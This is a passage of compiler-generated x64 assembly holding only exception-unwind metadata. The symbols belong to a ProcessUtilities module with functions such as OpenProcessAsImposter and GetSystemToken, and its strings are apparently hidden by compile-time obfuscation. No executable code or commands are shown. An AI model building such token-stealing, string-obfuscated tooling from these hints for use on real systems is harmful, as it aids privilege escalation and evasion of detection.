	DD	imagerel $cppxdata$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ DB 02H
	DB	0d0H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ DD 020611H
	DD	030025206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DB 02H
	DB	0aeH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?HaltProcessExecution@ProcessUtilities@@YAXXZ DB 02H
	DB	015H, 03H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?HaltProcessExecution@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?HaltProcessExecution@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$?HaltProcessExecution@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$?HaltProcessExecution@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?HaltProcessExecution@ProcessUtilities@@YAXXZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?HaltProcessExecution@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DB 02H
	DB	'%', 03H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DB 02H
	DB	'9', 02H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DB 02H
	DB	0aeH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DB 02H
	DB	019H, 02H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DB 02H
	DB	0b4H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ DB 02H
	DB	'9', 02H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
